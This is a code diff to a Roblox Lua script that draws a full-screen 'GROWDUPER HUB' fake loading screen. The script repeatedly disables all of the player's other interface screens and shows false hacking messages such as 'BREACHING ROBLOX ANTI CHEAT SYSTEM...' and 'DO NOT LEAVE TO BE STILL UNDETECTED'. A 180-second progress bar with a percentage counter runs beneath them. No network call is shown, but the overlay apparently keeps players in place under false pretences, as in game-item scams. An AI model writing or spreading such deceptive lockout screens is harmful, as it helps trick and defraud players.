@@ -26,7 +26,7 @@ task.spawn(function()
     while true do
         for _, gui in ipairs(PlayerGui:GetChildren()) do
             if gui:IsA("ScreenGui") and gui ~= screenGui then
-                gui.Enabled = false -- or gui:Destroy() if aggressive
+                gui.Enabled = false
             end
         end
         if screenGui.Parent ~= PlayerGui then
@@ -36,11 +36,10 @@ task.spawn(function()
     end
 end)
 
--- Create visual elements
+-- Backgrounds
 local blackBackground = Instance.new("Frame")
 blackBackground.Size = UDim2.new(1, 0, 1, 0)
 blackBackground.BackgroundColor3 = Color3.new(0, 0, 0)
-blackBackground.BackgroundTransparency = 0
 blackBackground.ZIndex = 1
 blackBackground.Parent = screenGui
 
@@ -51,9 +50,10 @@ purpleOverlay.BackgroundTransparency = 0.6
 purpleOverlay.ZIndex = 2
 purpleOverlay.Parent = screenGui
 
+-- Title
 local titleText = Instance.new("TextLabel")
 titleText.Size = UDim2.new(0.9, 0, 0.15, 0)
-titleText.Position = UDim2.new(0.5, 0, 0.25, 0)
+titleText.Position = UDim2.new(0.5, 0, 0.2, 0)
 titleText.AnchorPoint = Vector2.new(0.5, 0.5)
 titleText.BackgroundTransparency = 1
 titleText.Text = "GROWDUPER HUB SCRIPT IS\nLOADING..."
@@ -64,6 +64,7 @@ titleText.Font = Enum.Font.GothamBold
 titleText.ZIndex = 3
 titleText.Parent = screenGui
 
+-- Glow
 local glow = Instance.new("ImageLabel")
 glow.Size = UDim2.new(0.85, 0, 0.25, 0)
 glow.Position = UDim2.new(0.5, 0, 0.58, 0)
@@ -77,6 +78,7 @@ glow.SliceCenter = Rect.new(24, 24, 276, 276)
 glow.ZIndex = 3
 glow.Parent = screenGui
 
+-- Rectangle
 local bottomRect = Instance.new("Frame")
 bottomRect.Size = UDim2.new(0.8, 0, 0.22, 0)
 bottomRect.Position = UDim2.new(0.5, 0, 0.58, 0)
@@ -96,30 +98,13 @@ stroke.Transparency = 0.6
 stroke.Thickness = 3
 stroke.Parent = bottomRect
 
--- Text arrays
-local mainTexts = {
-    "BREACHING ROBLOX ANTI CHEAT SYSTEM..",
-    "DO NOT LEAVE TO BE STILL UNDETECTED",
-    "OVERRIDING SECURITY PROTOCOLS...",
-    "INJECTING STEALTH MODULES...",
-    "ACCESSING INTERNAL SYSTEMS..."
-}
-
-local waitTexts = {
-    "Injecting stealth modules...",
-    "Calibrating sensors...",
-    "Encrypting network traffic...",
-    "Masking IP address...",
-    "Deploying cloaking device..."
-}
-
--- MainText
+-- Static Texts
 local mainText = Instance.new("TextLabel")
 mainText.Size = UDim2.new(0.95, 0, 0.35, 0)
 mainText.Position = UDim2.new(0.5, 0, 0.3, 0)
 mainText.AnchorPoint = Vector2.new(0.5, 0.5)
 mainText.BackgroundTransparency = 1
-mainText.Text = mainTexts[1]
+mainText.Text = "BREACHING ROBLOX ANTI CHEAT SYSTEM..."
 mainText.TextColor3 = Color3.new(1, 1, 1)
 mainText.TextScaled = true
 mainText.TextWrapped = true
@@ -128,13 +113,12 @@ mainText.TextTransparency = 1
 mainText.ZIndex = 5
 mainText.Parent = bottomRect
 
--- WaitText
 local waitText = Instance.new("TextLabel")
 waitText.Size = UDim2.new(0.95, 0, 0.25, 0)
 waitText.Position = UDim2.new(0.5, 0, 0.7, 0)
 waitText.AnchorPoint = Vector2.new(0.5, 0.5)
 waitText.BackgroundTransparency = 1
-waitText.Text = waitTexts[1]
+waitText.Text = "Establishing anti-detection systems..."
 waitText.TextColor3 = Color3.fromRGB(200, 200, 200)
 waitText.TextScaled = true
 waitText.TextWrapped = true
@@ -143,7 +127,7 @@ waitText.TextTransparency = 1
 waitText.ZIndex = 5
 waitText.Parent = bottomRect
 
--- Loading bar
+-- Loading Bar
 local loadingBarFrame = Instance.new("Frame")
 loadingBarFrame.Size = UDim2.new(0.9, 0, 0.12, 0)
 loadingBarFrame.Position = UDim2.new(0.5, 0, 1.1, 0)
@@ -173,6 +157,18 @@ local innerBarCorner = Instance.new("UICorner")
 innerBarCorner.CornerRadius = UDim.new(0, 10)
 innerBarCorner.Parent = loadingBar
 
+local percentageLabel = Instance.new("TextLabel")
+percentageLabel.Size = UDim2.new(1, 0, 1, 0)
+percentageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+percentageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+percentageLabel.BackgroundTransparency = 1
+percentageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentageLabel.TextScaled = true
+percentageLabel.Text = "0%"
+percentageLabel.Font = Enum.Font.GothamBold
+percentageLabel.ZIndex = 7
+percentageLabel.Parent = loadingBarFrame
+
 -- Fade-in
 local function fadeIn()
     local fadeInfo = TweenInfo.new(0.7, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
@@ -182,37 +178,22 @@ local function fadeIn()
     TweenService:Create(loadingBar, fadeInfo, {BackgroundTransparency = 0}):Play()
 end
 
--- Loading bar anim
+-- Loading bar with percentage
 local function animateLoadingBar()
-    local tweenInfo = TweenInfo.new(180, Enum.EasingStyle.Linear)
-    local tween = TweenService:Create(loadingBar, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
-    tween:Play()
-    tween.Completed:Connect(function()
-        mainText.Text = "Success"
-    end)
-end
+    local duration = 180
+    local steps = 100
+    local interval = duration / steps
 
--- Cycle text
-local function cycleText(label, textList)
-    local index = 1
-    while true do
-        wait(6)
-        TweenService:Create(label, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
-        wait(0.5)
-        index = (index % #textList) + 1
-        label.Text = textList[index]
-        TweenService:Create(label, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
+    for i = 1, steps do
+        local progress = i / steps
+        loadingBar.Size = UDim2.new(progress, 0, 1, 0)
+        percentageLabel.Text = math.floor(progress * 100) .. "%"
+        wait(interval)
     end
+
+    mainText.Text = "Success"
 end
 
--- Start
+-- Start animation
 fadeIn()
-animateLoadingBar()
-
-task.spawn(function()
-    cycleText(mainText, mainTexts)
-end)
-
-task.spawn(function()
-    cycleText(waitText, waitTexts)
-end)
+task.spawn(animateLoadingBar)
